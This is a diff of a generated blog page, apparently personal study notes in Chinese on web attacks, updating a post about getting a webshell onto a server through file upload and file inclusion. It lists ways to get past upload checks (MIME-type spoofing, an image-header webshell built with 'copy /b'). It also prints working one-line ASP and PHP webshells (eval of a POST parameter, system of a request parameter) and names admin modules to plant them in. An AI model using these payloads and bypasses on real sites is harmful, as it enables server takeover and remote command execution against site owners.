@@ -8,7 +8,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://gods-fall.github.io/favicon.ico?v=1645371913901">
+<link rel="shortcut icon" href="https://gods-fall.github.io/favicon.ico?v=1645420902784">
 <link rel="stylesheet" href="https://gods-fall.github.io/styles/main.css">
 
 
@@ -18,14 +18,15 @@
 
 
 
-    <meta name="description" content="1.基本上传
+    <meta name="description" content="一.基本上传
 
 目标：把webshell丢进服务器里
 1.按要求与非要求上传确定回显信息
 2.看HTML是否为前端限制
 3后端限制绕过
-#&lt;%eval request(&quot;pass&quot;)%&gt; #asp #
-#&l..." />
+mime（content-type文件类型，大类别/具体类型）大类型绕过
+图片马绕过图片头
+cmd:co..." />
     <meta name="keywords" content="" />
   </head>
   <body>
@@ -35,7 +36,7 @@
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://gods-fall.github.io">
-        <img src="https://gods-fall.github.io/images/avatar.png?v=1645371913901" class="site-logo">
+        <img src="https://gods-fall.github.io/images/avatar.png?v=1645420902784" class="site-logo">
         <h1 class="site-title">godsfall</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -109,15 +110,22 @@
               </div>
             
             <div class="post-content" v-pre>
-              <p>1.基本上传</p>
+              <p>一.基本上传</p>
 <blockquote>
 <p>目标：把webshell丢进服务器里<br>
 1.按要求与非要求上传确定回显信息<br>
 2.看HTML是否为前端限制<br>
 3后端限制绕过<br>
+mime（content-type文件类型，大类别/具体类型）大类型绕过<br>
+图片马绕过图片头<br>
+cmd:copy /b tupian + 1.php 1.png</p>
+</blockquote>
+<p>二.文件包含 （包含函数）<br>
+判断 接入系统固定路径<br>
+本地包含<br>
+远程包含（接入远程文件链接）<br>
 #&lt;%eval request(&quot;pass&quot;)%&gt; #asp #<br>
 #&lt;php@eval($_POST['pass']);?&gt;# php #</p>
-</blockquote>
 <h1 id="system_requestcmd"><?system($_REQUEST['cmd']);?></h1>
 <p>利用审查突破前端限制，<br>
 一句话插入：《友情链接 页面编辑 模块编辑》<br>
